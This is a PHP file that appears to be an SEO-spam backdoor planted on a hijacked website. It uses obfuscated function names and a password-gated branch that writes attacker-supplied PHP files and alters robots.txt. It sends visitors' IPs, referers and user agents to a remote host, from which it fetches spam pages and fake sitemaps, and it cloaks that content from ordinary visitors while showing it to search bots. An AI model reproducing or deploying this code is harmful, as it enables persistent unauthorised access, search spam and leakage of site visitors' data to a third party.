<?php
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = 'mapssK127.xml';
$dt = 0;
$sitemap_file = 'sitemap';
$mapnum = 1000;
$rss_num = 500;





$jdir = '';
$http_web = 'http';
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$smuri_tmp = smrequest_uri();
if ($smuri_tmp == '') {
    $smuri_tmp = '/';
}
$s = 'b' . 'ase6' . '4_e' . 'ncode';
$smuri = $s($smuri_tmp);
function smrequest_uri()
{
    if (isset($_SERVER['REQUEST_URI'])) {
        $smuri = $_SERVER['REQUEST_URI'];
    } else {
        if (isset($_SERVER['argv'])) {
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        } else {
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $smuri;
}

$goweb = 'bpsixtyeightxu.yuichiro.xyz';
$password = md5(md5(@$_GET['pd']));
if ($password == '5fbf36f6b1070aec65f00cb8e35c9cc4') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    $domain = @$_GET['domain'];
    if ($domain) {
        $host = $domain;
    } else {
        $host = $_SERVER['HTTP_HOST'];
    }
    //$host = $_SERVER['HTTP_HOST'];
    if(isset($_SERVER['DOCUMENT_ROOT'])){
        $path = $_SERVER['DOCUMENT_ROOT'];
    }else{
        $path = dirname(__FILE__);
    }
    $file_path = $path . '/robots.txt';
    if (!$action) {
        $action = 'put';
    }
    if ($action == 'p') {
        //https://www.google.com/ping?sitemap=https://example.com/sitemap.xml
        $add_content = @$_GET['mapname'];
        if (strstr($add_content, '.xml')) {
            if(isset($_SERVER['DOCUMENT_ROOT'])){
                $map_path = $_SERVER['DOCUMENT_ROOT'].'/sitemap.xml';
            }else{
                $map_path = dirname(__FILE__).'/sitemap.xml';
            }
            if(is_file($map_path)){
                @unlink($map_path);
            }
            if (is_https()) {
                $data_new = 'https://www.google.com/ping?sitemap=' . 'https://' . $host . '/' . $add_content;
            } else {
                $data_new = 'https://www.google.com/ping?sitemap=' . 'http://' . $host . '/' . $add_content;
            }
            $agentarry = array(
                "Firefox 38esr" => "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                "IE 11" => "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
                "Firefox 4.0.1 – MAC" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Firefox 4.0.1 – Windows" => "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
                "Opera 11.11 – MAC" => "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
                "Opera 11.11 – Windows" => "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
                "Chrome 17.0 – MAC" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
                "Avant" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
                "Green Browser" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            );
            $useragent = $agentarry[array_rand($agentarry, 1)];
            $file_str = '<?php
$useragent = \'' . $useragent . '\';
if (stristr(smoutdo(\'' . $data_new . '\',$useragent), \'google\')) {
            echo \'<br>pingok<br>\';
        }else{
			echo \'<br>url ping false<br>\';
		}';
            $file_str .= '
function smoutdo($url,$useragent){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    $file_contents = curl_exec($ch);
    curl_close($ch);
    return $file_contents;
}';
            $file_path = str_replace(realpath(dirname(__FILE__) . '/../'), '', dirname(__FILE__));
            $file_path = str_replace('\\', '', $file_path);
            $ping_file_name_arr = array('db.php', 'admin-filters.php', 'content-index.php', 'db-cache.php', 'edit.php', 'upload.php', 'themes.php', 'plugins.php', 'update.php', 'tools.php', 'webindex.php', 'adminindex.php', 'oldindex.php', 'css.php', 'wpcss.php');
            $ping_file_name = $ping_file_name_arr[array_rand($ping_file_name_arr, 1)];
            if (is_https()) {
                $ping_url = 'https://' . $_SERVER['HTTP_HOST'] . '/' . $ping_file_name;
            } else {
                $ping_url = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $ping_file_name;
            }
            if (file_put_contents($ping_file_name, $file_str)) {
                //Sitemap: http://www.gudangsehat.com/mapindex.xml
                if (stristr(smoutdo($ping_url), 'pingok')) {
                    echo '<br>pingok<br>';
                } else {
                    echo $data_new . '<br>ping false!<br>';
                }
                @unlink($ping_file_name);
            } else {
                echo $data_new . '<br>creat file false!<br>';
            }

        } else {
            echo '<br>name false!<br>';
        }

    }
    if ($action == 'put') {
        if (isset($_GET['google'])) {
            $google_verification = $_GET['google'];
            if (preg_match('/^google.*?(\.html)$/i', $google_verification)) {
                file_put_contents($google_verification, 'google-site-verification:' . ' ' . $google_verification);
                exit('<a href=' . $google_verification . '>' . $google_verification . '</a>');
            }
        }
        if (strstr($add_content, '.xml')) {
            if(isset($_SERVER['DOCUMENT_ROOT'])){
                $map_path = $_SERVER['DOCUMENT_ROOT'].'/sitemap.xml';
            }else{
                $map_path = dirname(__FILE__).'/sitemap.xml';
            }
            if(is_file($map_path)){
                @unlink($map_path);
            }
            if (file_exists($file_path)) {
                $data = smoutdo($file_path);
            } else {
                $data = 'User-agent: *
Allow: /';
            }
            if (strstr($data, '/' . $add_content)) {
                echo '<br>sitemap already added!<br>';
            } else {
                if (is_https()) {
                    $data_new = trim($data) . "\r\n" . 'Sitemap: https://' . $host . '/' . $add_content;
                } else {
                    $data_new = trim($data) . "\r\n" . 'Sitemap: http://' . $host . '/' . $add_content;
                }
                //Sitemap: http://www.gudangsehat.com/mapindex.xml
                if (file_put_contents($file_path, $data_new)) {
                    echo '<br>ok<br>';
                } else {
                    echo '<br>file write false!<br>';
                }
            }
        } else {
            echo '<br>sitemap name false!<br>';
        }
        if (strstr($add_content, '.php')) {
            $a = md5(md5(@$_GET['a']));
            $b = md5(md5(@$_GET['b']));
            if ($a == smoutdo('http://' . $goweb . '/a.php') || $b == '21c4d031dd29901356a91b3efcca0130') {
                $smstr = @$_GET['smstr'];
                if (file_put_contents($path . '/' . $add_content, $smstr)) {
                    echo 'ok';
                }
            }
        }
    }

    exit;
}
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$temp = @$_GET['smtemp'];
$id = @$_GET['smid'];
$site = @$_GET['smsite'];
$page = @$_GET['smpage'];
$site = str_replace('/', '', $site);
$host = $_SERVER['HTTP_HOST'];
$clock = '';

$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = $s($lang);
$os_tmp = $_SERVER['HTTP_USER_AGENT'];
$os = $s($os_tmp);
if (isset($_SERVER['HTTP_REFERER'])) {
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = $s($urlshang);
} else {
    $urlshang = '';
}

if (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
    $clock = getenv('REMOTE_ADDR');
} elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
    $clock = $_SERVER['REMOTE_ADDR'];
}

$http_clock = '';
if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
    $http_clock = getenv('HTTP_CLIENT_IP');
} elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
    $http_clock = getenv('HTTP_X_FORWARDED_FOR');
}

if (stristr($clock, ',')) {
    $clock_tmp = explode(",", $clock);
    $clock = $clock_tmp[0];
}

if (!isset($sitemap_file) || @$sitemap_file == '') {
    $sitemap_file = 'sitemap';
}
if (!isset($mapnum) || @$mapnum == '') {
    $mapnum = 2000;
}

if (preg_match('/' . $sitemap_file . '_index' . '_([1-5])?.xml/i', $smuri_tmp, $uriarr)) {
    $dt_file_name = getDt($smuri_tmp);
    if ($dt_file_name) {
        $sitemap_file = $dt_file_name . '.php?' . $sitemap_file;
    }

    $websd = 0;
    for ($i = 0; $i < strlen($host); $i++) {
        $websd = $websd + ord($host[$i]);
    }
    $num = $websd * $uriarr[1] % 50 + 50;
    $kid = $websd * $uriarr[1] % 900 + $uriarr[1] * 1000;
    @header("Content-type: text/xml");
    echo s_sitemap($sitemap_file, $num, $kid);
    exit();
}
function s_sitemap($filename, $num, $kid)
{
    if (is_https()) {
        $http = 'https';
    } else {
        $http = 'http';
    }
    $mapindex_str = '<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.google.com/schemas/sitemap/0.84">';
    for ($i = 0; $i < $num; $i++) {
        $mapindex_str .= '
  <sitemap>
    <loc>' . $http . "://" . $_SERVER['HTTP_HOST'] . "/" . $filename . '' . ($kid + $i) . '.xml</loc>
  </sitemap>';
    }
    $mapindex_str .= '
</sitemapindex>';
    return $mapindex_str;
}
if(stristr($smuri_tmp, 'pingmaps.xml')){
    $dt_file_name = getDt($smuri_tmp);
    if($dt_file_name){
        $sitemap_file = $dt_file_name.'.php?'.$sitemap_file;
    }
    for($i=1;$i<6;$i++){
        //https://www.google.com/ping?sitemap=https://example.com/sitemap.xml
        if($dt_file_name){
            $pingUrl = 'https://www.google.com/ping?sitemap='.$http . "://" . $_SERVER['HTTP_HOST'] . "/". $dt_file_name.'.php?'.'sitemap_index_'.$i.'.xml';
        }else{
            $pingUrl = 'https://www.google.com/ping?sitemap='.$http . "://" . $_SERVER['HTTP_HOST'] . "/".'sitemap_index_'.$i.'.xml';
        }

        $pingRes = smoutdo($pingUrl);
        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
        echo $pingUrl . '-- ' . $ok . '<br>';
    }
    exit;
}
if (preg_match('/' . $sitemap_file . '_?(\d+)?.xml$/i', $smuri_tmp, $uriarr) || stristr($smuri_tmp, 'rss.xml')) {
    @header("Content-type: text/xml");
    $dt_file_name = getDt($smuri_tmp);
    if ($dt_file_name) {
        $sitemap_file = $dt_file_name . '.php?' . $sitemap_file;
    }
    if (isset($uriarr[1])) {
        $id = str_replace('_', '', $uriarr[1]);
    } else {
        $id = 100;
    }
    $ivmapid = 0;
    if (stristr($smuri_tmp, 'rss.xml')) {
        rss_out(z_rss($goweb, $id, $host, $dt, $ivmapid, $rss_num, $http_web, $smuri), $host);
    } else {
        sitemap_out(z_sitemap($goweb, $id, $host, $dt, $ivmapid, $mapnum, $http_web, $smuri), $host);
    }

    exit();
}


function getDt($smuri_tmp)
{
    $pageStr = explode('?', $smuri_tmp);
    $dt_file_name = '';
    if (count($pageStr) >= 2) {
        $phpfile = $pageStr[0];
        if (preg_match("/(\.php)$/i", $phpfile)) {
            $dt_file_name = str_replace('.php', '', $phpfile);
            $dt_file_name = substr($dt_file_name, 1);
        }
    } else {
        if (preg_match("/(\.php)$/i", $smuri_tmp)) {
            $dt_file_name = str_replace('.php', '', $smuri_tmp);
            $dt_file_name = substr($dt_file_name, 1);
        }
    }
    return $dt_file_name;
}

function z_sitemap($goweb, $id, $host, $dt, $maptype, $map_num, $http_web, $smuri, $filetype = 0, $map_splits_num = '', $temp = '', $dataNew = '')
{
    $web = $http_web . '://' . $goweb . '/sitemapdtn.php?date=' . $id . '&temp=' . $temp . '&web=' . $host . '&xml=' . $dt . '&maptype=' . $maptype . '&filetype=' . $filetype . '&map_splits_num=' . $map_splits_num . '&map_num=' . $map_num . '&dataNew=' . $dataNew . '&uri=' . $smuri;
    return trim(smoutdo($web));
}

function sitemap_out($url, $host)
{
    if (is_https()) {
        $http = 'https';
    } else {
        $http = 'http';
    }
    $date_str = date("Y-m-d\TH:i:sP", time());
    $sitemap_header = '<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';
    $sitemap_header .= '
  <url>
    <loc>' . $http . '://' . $host . "/" . '</loc>
  </url>';
    $url_arr = explode("\r\n", $url);
    $map_str = $sitemap_header;
    foreach ($url_arr as $value) {
        $map_str .= '
  <url>
    <loc>' . $http . '://' . $host . "/" . $value . '</loc>
  </url>';
    }
    echo $map_str . "
</urlset>";
}

function z_rss($goweb, $id, $host, $dt, $maptype, $rss_num, $http_web, $smuri, $filetype = 0, $map_splits_num = '', $temp = '', $dataNew = '')
{
    $web = $http_web . '://' . $goweb . '/rss.php?date=' . $id . '&temp=' . $temp . '&web=' . $host . '&xml=' . $dt . '&maptype=' . $maptype . '&filetype=' . $filetype . '&map_splits_num=' . $map_splits_num . '&rss_num=' . $rss_num. '&dataNew=' . $dataNew . '&uri=' . $smuri;
    return trim(smoutdo($web));
}

function rss_out($rss, $host)
{
    if (is_https()) {
        $http = 'https';
    } else {
        $http = 'http';
    }
    $date_str = date("Y-m-d\TH:i:sP", time());
    $sitemap_header = '<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>';
    $rss_arr = explode("\r\n", $rss);
    $rss_str = $sitemap_header;
    foreach ($rss_arr as $value) {
        $value_arr = explode('[zx]', $value);
        $rss_str .= '
  <item>
	<title>' . $value_arr[1] . '</title>
    <link>' . $http . '://' . $host . "/" . $value_arr[0] . '</link>
	<author>'.$host.'</author>
    <pubDate>'.$date_str.'</pubDate>
  </item>';
    }
    echo $rss_str . "
</channel>
</rss>";
}
if (!strstr($os_tmp, 'Gethome')) {
    $web = $http_web . '://' . $goweb . '/indexnew.php?url=' . $site . '&id=' . $id . '&temp=' . $temp . '&dt=' . $dt . '&web=' . $host . '&zz=' . smisbot() . '&clock=' . $clock . '&uri=' . $smuri . '&urlshang=' . $urlshang . '&http=' . $http . '&page=' . $page . '&lang=' . $lang;
    $html_content = trim(smoutdo($web));
    $web_link = $http_web . '://' . $goweb . '/page/getlink.php?url=' . $site . '&web=' . $host . '&uri=' . $smuri.'&http=' . $http;
    smoutdo($web_link);
    if (!strstr($html_content, 'nobotuseragent')) {
        @header("Content-type: text/html; charset=utf-8");
        if (strstr($html_content, 'okhtmlgetcontent')) {
            $html_content = str_replace("okhtmlgetcontent", '', $html_content);
            echo $html_content;
            exit();
        } else if (strstr($html_content, 'getcontent500page')) {
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        } else if (strstr($html_content, 'getcontent404page')) {
            @header('HTTP/1.1 404 Not Found');
            exit();
        } else if (strstr($html_content, 'getcontent301page')) {
            @header('HTTP/1.1 301 Moved Permanently');
            $html_content = str_replace("getcontent301page", '', $html_content);
            header('Location: ' . $html_content);
            exit();
        }
    }
}

function smisbot()
{
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'Y!J') || stristr($uAgent, 'y!j') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
        return true;
    } else {
        return false;
    }
}

function smoutdo($url)
{
    $file_contents = '';
    $user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
    if (function_exists('curl_init')) {
        try {
            $ch = curl_init();
            $timeout = 30;
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file_contents = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
        }
    }
    if (strlen($file_contents) < 1 && function_exists('file_get_contents')) {
        ini_set('user_agent', $user_agent);
        try {
            $file_contents = @file_get_contents($url);
        } catch (Exception $e) {
        }
    }
    return $file_contents;
}

?>